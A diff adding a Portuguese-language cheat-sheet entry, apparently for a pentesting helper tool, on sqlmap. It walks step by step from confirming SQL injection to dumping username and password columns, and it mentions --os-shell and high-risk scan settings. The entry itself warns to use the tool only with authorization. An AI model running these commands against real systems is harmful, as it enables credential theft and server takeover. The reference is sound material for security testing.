@@ -1,0 +1,29 @@
+NOME="sqlmap"
+CATEGORIA="Exploração web (SQL injection)"
+ALIASES=""
+DESC="Detecta e explora falhas de injeção de SQL de forma automatizada em parâmetros web. Vai desde confirmar a injeção até extrair bancos, tabelas e dados — sempre de forma incremental."
+EXEMPLO='sqlmap -u "<url>?id=1" --batch --dbs'
+PASSOS="- sqlmap: a ferramenta
+- -u \"<url>?id=1\": URL com um parâmetro testável (o id=1 será o alvo do teste)
+- --batch: responde às perguntas com o padrão (não interativo)
+- --dbs: se houver injeção, lista os bancos de dados disponíveis"
+FLUXO="1) Teste se o parâmetro é injetável:
+\$ sqlmap -u \"<url>?id=1\" --batch
+   (para requisições com login/POST/headers, capture no Burp e salve em req.txt:)
+\$ sqlmap -r req.txt --batch
+2) Se for vulnerável, liste os bancos de dados:
+\$ sqlmap -u \"<url>?id=1\" --batch --dbs
+3) Escolha um banco e liste as tabelas dele:
+\$ sqlmap -u \"<url>?id=1\" --batch -D <banco> --tables
+4) Escolha uma tabela e liste as colunas:
+\$ sqlmap -u \"<url>?id=1\" --batch -D <banco> -T <tabela> --columns
+5) Extraia (dump) os dados que interessam:
+\$ sqlmap -u \"<url>?id=1\" --batch -D <banco> -T <tabela> -C usuario,senha --dump
+   - Para ir mais fundo: --dump-all, --os-shell (shell no SO) ou --sql-shell.
+   - Aumente a chance de achar com --level=5 --risk=3 (mais testes, mais barulho)."
+DICA="Vá do menos para o mais invasivo: confirmar -> --dbs -> tabelas -> dump.
+Sempre prefira -r req.txt para alvos reais (mantém cookies/headers/sessão).
+Erro comum: subir direto para --level/--risk altos (muito lento e barulhento) sem
+antes confirmar a injeção. IMPORTANTE: rode apenas em aplicações suas ou com
+autorização escrita — extrair dados de terceiros é crime."
+VER_TAMBEM="gau/katana (achar URLs com parâmetros), ffuf (fuzz de parâmetros), dalfox (XSS)"
